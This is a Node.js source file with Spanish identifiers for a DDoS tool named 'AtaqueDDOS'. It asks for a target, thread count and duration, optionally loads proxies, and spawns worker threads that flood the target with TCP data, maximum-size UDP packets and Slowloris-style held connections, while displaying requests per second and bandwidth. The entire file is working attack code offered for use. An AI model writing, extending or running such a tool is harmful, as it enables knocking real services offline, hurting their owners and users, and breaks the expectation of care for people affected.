#!/usr/bin/env node
'use strict';

const net = require('net');
const dgram = require('dgram');
const http = require('http');
const { Worker, isMainThread, parentPort, workerData } = require('worker_threads');
const { performance } = require('perf_hooks');
const readline = require('readline');
const chalk = require('chalk');
const { randomBytes, randomFillSync } = require('crypto');
const url = require('url');
const dns = require('dns/promises');
const fs = require('fs');

class AtaqueDDOS {
    constructor() {
        this.estadisticas = { total: 0, exitosas: 0, fallidas: 0, anchoBanda: 0 };
        this.trabajadores = [];
        this.metodos = ['TCP', 'UDP', 'SLOWLORIS'];
        this.proxies = [];
    }

    async iniciar() {
        const objetivo = await this.preguntar(chalk.greenBright('Objetivo (URL/IP): '));
        const { hostname, puerto } = await this.parsearObjetivo(objetivo);
        const hilos = await this.numeroEntre(chalk.greenBright('Hilos (100-1000): '), 100, 1000);
        const duracion = await this.numeroEntre(chalk.greenBright('Duración (segundos): '), 10, 3600);
        const usarProxies = await this.preguntar(chalk.greenBright('¿Usar proxies (Sí/No)? '));

        if (usarProxies.toLowerCase() === 'sí') await this.cargarProxies();

        this.tiempoInicio = performance.now();
        this.iniciarTrabajadores(hostname, puerto, hilos);
        this.mostrarEstadisticas();
        setTimeout(() => this.detener(), duracion * 1000);
    }

    async cargarProxies() {
        const archivoProxies = await this.preguntar(chalk.greenBright('Archivo de proxies (formato IP:PUERTO): '));
        try {
            this.proxies = fs.readFileSync(archivoProxies, 'utf-8').split('\n').filter(Boolean);
            console.log(chalk.green('Proxies cargados correctamente.'));
        } catch (error) {
            console.error(chalk.red('Error al cargar proxies.'));
            process.exit(1);
        }
    }

    async parsearObjetivo(entrada) {
        try {
            if (net.isIP(entrada)) return { hostname: entrada, puerto: 80 };
            if (!entrada.includes('://')) entrada = 'http://' + entrada;

            const urlObj = new url.URL(entrada);
            const dnsResuelto = await dns.lookup(urlObj.hostname);

            return {
                hostname: dnsResuelto.address,
                puerto: urlObj.port || 80
            };
        } catch (error) {
            console.error(chalk.red('\nError: Objetivo inválido'));
            process.exit(1);
        }
    }

    iniciarTrabajadores(objetivo, puerto, hilos) {
        const nucleos = Math.min(require('os').cpus().length, 16);
        const cargas = this.generarCargas(objetivo);

        for (let i = 0; i < nucleos; i++) {
            const worker = new Worker(__filename, {
                workerData: {
                    objetivo,
                    puerto,
                    cargas,
                    metodos: this.metodos,
                    intensidad: Math.ceil(hilos / nucleos),
                    proxies: this.proxies
                }
            });

            worker.on('message', msg => this.actualizarEstadisticas(msg));
            this.trabajadores.push(worker);
        }
    }

    generarCargas(objetivo) {
        const crearCarga = tamaño => {
            const buf = Buffer.alloc(tamaño);
            randomFillSync(buf);
            return buf;
        };

        return {
            tcp: crearCarga(1024),
            udp: crearCarga(65507),
            http: `GET /${randomBytes(8).toString('hex')} HTTP/1.1\r\nHost: ${objetivo}\r\n\r\n`
        };
    }

    actualizarEstadisticas({ total, exitosas, fallidas, anchoBanda }) {
        this.estadisticas.total += total;
        this.estadisticas.exitosas += exitosas;
        this.estadisticas.fallidas += fallidas;
        this.estadisticas.anchoBanda += anchoBanda;
    }

    mostrarEstadisticas() {
        if (!this.tiempoInicio) return;

        const transcurrido = (performance.now() - this.tiempoInicio) / 1000;
        const rps = (this.estadisticas.total / transcurrido || 0).toFixed(0);
        const bw = (this.estadisticas.anchoBanda / 1024 ** 3).toFixed(3);

        process.stdout.write(
            chalk`\r{cyan [${transcurrido.toFixed(1)}s]} ` +
            chalk`{white Peticiones:} {cyan ${this.estadisticas.total}} ` +
            chalk`{green Éxito:} {cyan ${this.estadisticas.exitosas}} ` +
            chalk`{red Fallo:} {cyan ${this.estadisticas.fallidas}} ` +
            chalk`{yellow RPS:} {cyan ${rps}} ` +
            chalk`{magenta BW:} {cyan ${bw}GB}`
        );

        setTimeout(() => this.mostrarEstadisticas(), 250);
    }

    async preguntar(pregunta) {
        return new Promise(resolve => {
            const rl = readline.createInterface({
                input: process.stdin,
                output: process.stdout
            });
            rl.question(pregunta, respuesta => {
                rl.close();
                resolve(respuesta);
            });
        });
    }

    async numeroEntre(pregunta, min, max) {
        let num;
        do num = parseInt(await this.preguntar(pregunta)) || min;
        while (num < min || num > max);
        return num;
    }

    detener() {
        this.trabajadores.forEach(w => w.terminate());
        console.log(chalk.red('\n\nAtaque detenido'));
        process.exit();
    }
}

if (isMainThread) {
    new AtaqueDDOS().iniciar();
} else {
    const { objetivo, puerto, cargas, metodos, intensidad, proxies } = workerData;
    const conexionesActivas = new Set();

    const metodosAtaque = {
        TCP: () => {
            const socket = net.connect(puerto, objetivo);
            socket.setNoDelay(true);
            
            const keepAlive = () => {
                socket.write(cargas.tcp);
                setTimeout(keepAlive, 50);
            };
            
            socket.on('connect', () => {
                keepAlive();
                conexionesActivas.add(socket);
            });
            
            socket.on('error', () => {
                conexionesActivas.delete(socket);
                parentPort.postMessage({ total: 1, exitosas: 0, fallidas: 1, anchoBanda: 0 });
            });
        },

        UDP: () => {
            const socket = dgram.createSocket('udp4');
            const sendPacket = () => {
                socket.send(cargas.udp, puerto, objetivo, (err) => {
                    if (!err) parentPort.postMessage({ total: 1, exitosas: 1, fallidas: 0, anchoBanda: cargas.udp.length });
                });
                setTimeout(sendPacket, 10);
            };
            sendPacket();
        },

        SLOWLORIS: () => {
            const socket = net.connect(puerto, objetivo);
            let headers = [
                'GET / HTTP/1.1',
                `Host: ${objetivo}`,
                'User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0)',
                'Content-Length: 42',
                'X-a: ' + randomBytes(4).toString('hex')
            ].join('\r\n') + '\r\n\r\n';
            
            socket.write(headers);
            conexionesActivas.add(socket);
            
            const keepAlive = () => {
                socket.write('X-a: ' + randomBytes(4).toString('hex') + '\r\n');
                setTimeout(keepAlive, 15000);
            };
            keepAlive();
            
            socket.on('error', () => conexionesActivas.delete(socket));
        }
    };

    setInterval(() => {
        const metodo = metodos[Math.floor(Math.random() * metodos.length)];
        for (let i = 0; i < intensidad; i++) metodosAtaque[metodo]();
    }, 100);
}